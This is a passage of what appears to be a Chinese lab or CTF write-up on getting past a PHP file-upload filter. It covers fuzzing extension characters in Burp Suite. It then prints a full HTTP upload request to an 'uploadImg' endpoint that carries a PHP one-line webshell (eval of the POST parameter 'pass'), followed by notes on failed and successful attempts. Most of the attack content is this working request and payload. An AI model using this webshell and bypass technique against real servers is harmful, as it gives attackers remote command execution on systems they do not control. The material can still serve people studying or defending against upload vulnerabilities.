...
1、学到新的绕过php限制方法
.&lt;&gt;php
总结：在bp的repeater中尝试使用各种符号，来检验何种可以绕过
（或者添加一个字符，然后设置为有效载荷，使用pb跑，分析数据包长度与其他不一样的可能就成功了）
...
在页面随便抓包，然后套用上传页面的数据包

一句话木马密码为pass
（去掉引号后，可以使用构造参数去执行命令）
<pre><code>POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: 123.58.224.8:55392
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=k41tp9sksdh003c3ddv7tqkgj0; think_language=zh-CN
Connection: close
...
&lt;?php echo 'successful';@eval($_POST['pass'])?&gt;
----------------------------921378126371623762173617--</code></pre>
<hr/>
 (失败的)
上传失败

 上传成功，但不能被识别为php后缀<img alt="" height="588" src="https://img-blog.csdnimg.cn/1050c86db3494887b1f54a05999e2c31.png" width="1200"/>

 <img alt="" height="262" src="https://img-blog.csdnimg.cn/4fd5f3bd2ae8494bb5f110fd97f38f1f.png" width="1145"/>
 <img alt="" height="386" src="https://img-blog.csdnimg.cn/370d346a703442a7b94da975533bc766.png" width="1200"/>
